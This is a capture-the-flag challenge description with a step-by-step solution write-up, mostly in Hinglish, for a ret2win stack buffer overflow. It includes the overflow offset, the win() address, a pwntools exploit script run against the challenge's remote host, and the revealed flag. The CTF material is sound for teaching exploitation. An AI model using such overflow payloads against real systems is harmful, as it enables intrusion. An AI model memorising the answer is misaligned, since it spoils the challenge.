Task 03
Binary Exploitation

This challenge uses an insecure memory buffer, also known as a buffer overflow. Exploit it to reach the part of the program that contains the flag in the format BYTE{...}. The flag in the provided dummy binary is fake. The actual challenge runs as a remote service; connect with Netcat (nc) using the supplied host and port.
Remote challenge endpoint
nc cybersub.bytesoc.dev 9999

    Download the provided ZIP and extract it. Keep all extracted files in the same folder.
    Run chall.sh to start the local challenge. Analyze the dummy binary to find and understand the insecure buffer and how the vulnerability is triggered.
    The flag in the local dummy binary is fake. After analyzing it, connect to the remote instance at nc cybersub.bytesoc.dev 9999 or solve it with a script you wrote.
    Submit your solution as part of the Cyber Security submission.

Find the flag that is in the format BYTE{}


-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


Step 1: File extract karna
Bashunzip byte-cybersecurity-challenge.zip
Sirf ek file mili:  (32-bit ELF binary)

Step 2: Basic analysis
Bashfile chall
strings chall
Important strings mile:

Welcome to ret2win!
Give me your input:
You win!
FLAG
FLAG_NOT_SET

Isse clear ho gaya ki yeh ret2win type challenge hai.

Step 3: Disassemble karna
Bashobjdump -d chall | less
Do important functions mile:

vuln() → Yahan vulnerability hai
win() → Address = 0x80491a6 (yahan flag print hota hai)


Step 4: Vulnerability samajhna
vuln() function mein:
Cchar buffer[68];                // chhota buffer
read(0, buffer, 200);           // 200 bytes padh raha hai → Buffer Overflow
Stack layout:

Buffer start hota hai -0x48(%ebp) se
Return address tak 76 bytes ka distance hai


Step 5: Payload banana
Pythonfrom pwn import *

win_addr = 0x80491a6
offset = 76

payload = b"A" * offset + p32(win_addr)

Step 6: Remote server pe exploit karna
Pythonfrom pwn import *

io = remote("cybersub.bytesoc.dev", 9999)

print(io.recvuntil(b"input:").decode())
io.send(payload)

print(io.recvall(timeout=3).decode())

Step 7: Result
textYou win!
BYTE{Buff3r_OverFl0w_k3_N45he}

Final Answer:
BYTE{Buff3r_OverFl0w_k3_N45he}

Summary:

